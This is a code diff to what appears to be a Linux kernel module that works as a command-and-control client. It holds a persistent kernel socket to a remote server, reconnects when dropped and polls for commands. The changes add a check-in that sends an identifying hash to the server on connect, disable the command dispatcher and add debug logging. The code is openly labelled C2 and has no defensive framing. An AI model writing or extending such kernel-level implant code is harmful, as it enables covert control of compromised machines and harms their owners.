@@ -53,7 +53,7 @@ static void connect_to_server(void) {
     return;
 }
 
-static void send_message(struct kvec *vec) {
+static int send_message(struct kvec *vec) {
     struct msghdr msg_hdr;
     int ret;
 
@@ -62,10 +62,10 @@ static void send_message(struct kvec *vec) {
     ret = kernel_sendmsg(conn_socket, &msg_hdr, vec, 1, vec->iov_len);
     if (ret < 0) {
         pr_err("Send error: %d\n", ret);
-        return;
+        return ret;
     }
 
-    return;
+    return ret;
 }
 
 static void analyze_the_command(char *command) {
@@ -75,28 +75,29 @@ static void analyze_the_command(char *command) {
     vec.iov_len = BUFFER_SIZE - 1;
     memset(buffer, 0x00, BUFFER_SIZE);
 
-    switch (command[0])
-    {
-    // System info
-    case 0x00:
-        // cpu_stat();
-        // os_info(&vec);
-        // send_message(&vec);
-        break;
+    // switch (command[0])
+    // {
+    // // System info
+    // case 0x00:
+    //     // cpu_stat();
+    //     // os_info(&vec);
+    //     // send_message(&vec);
+    //     break;
     
-    default:
-        // send_message("0");
-        break;
-    }
+    // default:
+    //     // send_message("0");
+    //     break;
+    // }
 
     return;
 }
 
-int handle_server_command(void *unused) {
+int handle_server_command(void *ex_hash) {
     struct msghdr msg_hdr;
     struct kvec vec;
     char buffer[BUFFER_SIZE];
     int ret;
+    bool isSendHash = false;
 
     msg_hdr.msg_flags = 0;
     vec.iov_base = buffer;
@@ -104,11 +105,25 @@ int handle_server_command(void *unused) {
 
     while (!kthread_should_stop()) {
         if (conn_socket) {
+            if (!isSendHash) {
+                pr_info("%s", (char *)ex_hash);
+                vec.iov_base = (char *)ex_hash;
+                vec.iov_len = strlen((char *)ex_hash);
+                if (send_message(&vec) <= 0) {
+                    pr_info("no send ex_hash");
+                    conn_socket = NULL;
+                    continue;
+                }
+                pr_info("send ex_hash");
+                isSendHash = true;
+            }
+            // msleep(500); 
             ret = kernel_recvmsg(conn_socket, &msg_hdr, &vec, 1, vec.iov_len, MSG_DONTWAIT);
-
+            // ret = kernel_recvmsg(conn_socket, &msg_hdr, &vec, 1, vec.iov_len, 0);
+            pr_info("%d", ret);
             if (ret > 0) {
                 buffer[ret] = '\0';
-                analyze_the_command(buffer);
+                // analyze_the_command(buffer);
                 // pr_info("%s\n", buffer);
                 memset(buffer, 0x00, ret);
 
@@ -116,7 +131,6 @@ int handle_server_command(void *unused) {
                 pr_info("[C2] Server disconnected\n");
                 sock_release(conn_socket);
                 conn_socket = NULL;
-
             } else {
                 pr_err("[C2] Receive error: %d\n", ret);
                 msleep(RECV_DELAY);
@@ -126,6 +140,7 @@ int handle_server_command(void *unused) {
         } else {
             msleep(RECONNECT_DELAY);
             connect_to_server();
+            isSendHash = false;
         }
 
     }
